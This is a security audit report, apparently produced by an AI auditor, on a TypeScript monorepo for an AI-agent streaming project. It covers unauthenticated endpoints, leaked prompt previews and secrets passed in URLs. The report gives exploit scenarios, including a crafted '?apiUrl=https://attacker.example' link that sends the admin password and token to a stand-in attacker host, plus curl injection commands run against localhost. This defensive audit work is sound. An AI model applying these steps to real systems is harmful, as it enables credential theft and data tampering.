# Security Audit Report

**Date:** 2026-03-27
**Auditor:** Codex
**Scope:** no-trueman-show monorepo

## Project Summary

- Stack: TypeScript/Node 20 monorepo, Fastify 5, WebSockets, Drizzle/PostgreSQL, Redis/BullMQ, Vite/Phaser frontend, Caddy, Docker Compose
- Attack surface: HTTP endpoints in `packages/agent-brain/src/health-server.ts`, public/admin frontend in `apps/companion-web`, Twitch/chat input in `packages/chat-service`
- Lines audited: ~3800 lines across code, docs, and deployment config
- Test suite: Vitest workspace; verified `@nts/agent-brain`, `@nts/chat-service`, `@nts/shared`

## Executive Summary

- Critical findings: 0
- High: 4
- Medium: 1
- Low: 0
- Test quality: WEAK for security assurances

Top risks:

1. Public unauthenticated read/write access to persisted agent state
2. Public API exposes LLM prompt/system/response previews
3. Unauthenticated `/api/llm-log` allows feed poisoning and DB spam
4. Provider secrets are passed in URL query strings and browser context

## Phase 1: Recon

### Stack

- Backend: Fastify + `@fastify/websocket`
- Auth: bcrypt password check + JWT bearer auth for `/api/admin/*`
- Database: PostgreSQL via Drizzle ORM
- Frontend: Vite + companion web app + Phaser renderer
- Deployment: Docker Compose + Caddy reverse proxy
- Tests: Vitest in workspace mode

### Entry Points

- Public HTTP:
  - `GET /health`
  - `GET /metrics`
  - `POST /state/save`
  - `GET /state/load/:agentId`
  - `POST /api/llm-log`
  - `GET /api/public/feed`
  - `GET /api/public/stats`
  - `GET /api/public/gallery`
  - `GET /api/public/emotions`
- Admin HTTP:
  - `POST /api/admin/login`
  - `GET /api/admin/brain-state`
  - `GET /api/admin/settings`
  - `POST /api/admin/settings`
  - `GET /api/admin/memories`
  - `GET /api/admin/llm-calls`
  - `GET /api/admin/stats`
  - `GET /api/admin/state-history`
  - `POST /api/admin/reset`
  - `POST /api/admin/force-activity`
- WebSockets:
  - `GET /ws/mind-feed`
  - `GET /ws/admin-feed`

### Auth Model

- `POST /api/admin/login`: password -> JWT
- `/api/admin/*`: JWT bearer required
- `/ws/admin-feed`: JWT in query parameter
- `/state/*`, `/api/llm-log`, `/api/public/*`, `/ws/mind-feed`: no auth

### Security Docs Reviewed

- `docs/SECURITY.md`
- `docs/security-spec.md`
- `docs/README.md`

## Findings

### F1: Public state read/write endpoints without auth

- Severity: HIGH
- Category: auth | exposure
- Evidence:
  - `packages/agent-brain/src/health-server.ts:153` defines `POST /state/save` with validation only
  - `packages/agent-brain/src/health-server.ts:180` defines `GET /state/load/:agentId` with no auth
  - `Caddyfile:24` proxies `/state/*`
  - `docker-compose.prod.yml:29-31` publishes port `3001` directly
- Impact:
  - Anyone who can reach the service can fetch current persisted state
  - Anyone can overwrite persisted state with schema-valid payloads
  - This is an integrity and availability issue, not just information disclosure
- Exploit scenario:
  1. Request `GET /state/load/truman`
  2. Modify returned JSON
  3. Send modified payload to `POST /state/save`
  4. Agent resumes from attacker-controlled state
- Recommendation:
  - Remove public exposure of `/state/*`
  - Restrict to internal traffic or require service auth
  - Add rate limiting
- Test coverage: present but misleading; tests validate this behavior as normal

### F2: Public feed exposes prompt/system/response previews

- Severity: HIGH
- Category: exposure
- Evidence:
  - `packages/agent-brain/src/health-server.ts:458-489` includes `llmCallLog.getPublicRecentCalls()`
  - `packages/memory-service/src/llm-call-log.ts:106-119` returns `promptPreview`, `systemPreview`, `responsePreview`
  - `docs/SECURITY.md:134-143` claims raw prompts and sensitive data are stripped
- Impact:
  - Public endpoint leaks fragments of prompt engineering and model outputs
  - Error cases may also expose internal failure strings
- Exploit scenario:
  1. Request `GET /api/public/feed`
  2. Read `promptPreview`, `systemPreview`, `responsePreview`
  3. Recover internal prompt structure and recent content
- Recommendation:
  - Remove preview fields from public API
  - Use a strict allowlist for public feed data
- Test coverage: missing for endpoint-level behavior

### F3: `/api/llm-log` accepts unauthenticated writes and poisons public feed

- Severity: HIGH
- Category: auth | abuse
- Evidence:
  - `packages/agent-brain/src/health-server.ts:304-339` explicitly exposes `POST /api/llm-log` with no auth
  - `packages/agent-brain/src/health-server.ts:472-479` republishes LLM log data through public feed
- Runtime verification:
  - `POST http://localhost:3001/api/llm-log` with no auth returned `200 OK`
  - Response: `{"ok":true,"id":"9023f01e-3048-4c16-b365-be4aa4c5d37b"}`
  - The injected marker `AUDIT-MARKER-LLMLOG-20260327` then appeared in `GET /api/public/feed?limit=10`
- Impact:
  - Anyone can insert arbitrary LLM log rows
  - Public feed can be polluted with attacker-chosen content
  - DB can be spammed
- Exploit scenario:
  1. Send arbitrary JSON to `/api/llm-log`
  2. Server stores row in DB
  3. Row is visible in `/api/public/feed`
- Recommendation:
  - Restrict endpoint to internal/service-authenticated callers
  - Add schema validation beyond minimal required fields
  - Add rate limiting
- Test coverage: missing

### F4: Provider secrets are passed in URL query strings

- Severity: HIGH
- Category: secrets | config
- Evidence:
  - `packages/renderer/src/main.ts:26-29` reads `?apiKey=...`
  - `packages/renderer/src/systems/TTSManager.ts:220-234` reads `?openaiKey=...`
  - `docker-compose.prod.yml:63` builds `STREAM_URL` with `apiKey` and `openaiKey`
  - `docs/README.md:25-45` documents this pattern directly
- Impact:
  - Keys land in browser history, logs, process environment, crash dumps, and any code with access to `window.location`
  - This breaks the claim that secrets are only loaded from environment
- Exploit scenario:
  1. User or automation opens URL with provider key in query string
  2. Key is retained in browser/browser-automation context and logs
  3. Any XSS, extension, logging layer, or diagnostics can capture it
- Recommendation:
  - Move provider calls server-side
  - Stop passing provider secrets through URL params
  - Stop embedding keys into `STREAM_URL`
- Test coverage: missing

### F5: `?apiUrl=` can exfiltrate admin password and bearer token

- Severity: MEDIUM
- Category: auth | token-handling
- Evidence:
  - `apps/companion-web/src/admin/login.ts:5-13` accepts arbitrary `?apiUrl=`
  - `apps/companion-web/src/admin/login.ts:30-49` posts password to `${API_BASE}/login`
  - `apps/companion-web/src/admin/dashboard.ts:138-143` forwards bearer token to `${getApiBase()}${path}`
  - `apps/companion-web/src/admin/controls.ts:71-76` forwards bearer token on mutating actions
- Impact:
  - A crafted admin URL can redirect login credentials and JWTs to an attacker-controlled origin
- Exploit scenario:
  1. Victim opens `/admin.html?apiUrl=https://attacker.example`
  2. Login form sends admin password to attacker
  3. Subsequent dashboard/actions send bearer token to attacker
- Recommendation:
  - Remove the override in production
  - Or restrict it to same-origin / allowlisted origins only
- Test coverage: missing

## Documentation vs Reality

| Claim | Status | Evidence |
|---|---|---|
| `docs/SECURITY.md` says zero HIGH findings remain | INCORRECT | Code still contains multiple HIGH issues above |
| Public feed strips raw LLM prompts/tool I/O/debug info | INCORRECT | Public feed returns `promptPreview`, `systemPreview`, `responsePreview` |
| All secrets externalized to `.env` | PARTIAL | Provider keys are also consumed from URL query params |
| 3-layer sanitizer includes AI classification and operator review | MISSING | Actual sanitizer is regex/context/injection checks only |

## Test Quality Audit

### Tests run

- `npm test --workspace=@nts/agent-brain`
- `npm test --workspace=@nts/chat-service`
- `npm test --workspace=@nts/shared`

### Result

- All executed tests passed
- Green suite does not provide reliable assurance for the findings above

### Specific test issues

- `packages/agent-brain/src/__tests__/admin-api.test.ts:87-107`
  - Rate-limit test accepts either `401` or `429`
  - This can pass even when rate limiting is broken
- `packages/agent-brain/src/__tests__/websocket-feed.test.ts:123-138`
  - "Auth" test does not perform a real WebSocket handshake
  - It only calls the mock verifier directly
- `packages/agent-brain/src/__tests__/state-endpoints.test.ts`
  - Confirms unauthenticated state persistence behavior instead of flagging it
- Missing tests:
  - `/api/llm-log` unauthorized access
  - `/api/public/feed` exposure of previews
  - `?apiUrl=` hostile-origin exfiltration
  - Deployment exposure from direct `3001:3001` publishing

## Recommended Actions

1. Lock down `/state/*` and `/api/llm-log` behind service auth or internal networking only
2. Remove LLM preview fields from `/api/public/feed`
3. Eliminate URL-based provider secrets (`apiKey`, `openaiKey`)
4. Remove or constrain `?apiUrl=` override
5. Rewrite security tests to assert real protections, not mocked wiring

## Verified Commands

Local runtime verification performed against the running app on `http://localhost:3001`:

```bash
curl -i -sS http://localhost:3001/health

curl -i -sS -X POST http://localhost:3001/api/llm-log \
  -H 'Content-Type: application/json' \
  --data '{"model":"audit-test/model","durationMs":123,"promptPreview":"AUDIT-MARKER-LLMLOG-20260327","systemPreview":"AUDIT-SYSTEM","responsePreview":"AUDIT-RESPONSE","success":true}'

curl -sS 'http://localhost:3001/api/public/feed?limit=10'
```

Observed behavior:

- `/health` returned `200 OK`
- `/api/llm-log` returned `200 OK` without auth
- Injected marker appeared in public feed immediately afterward
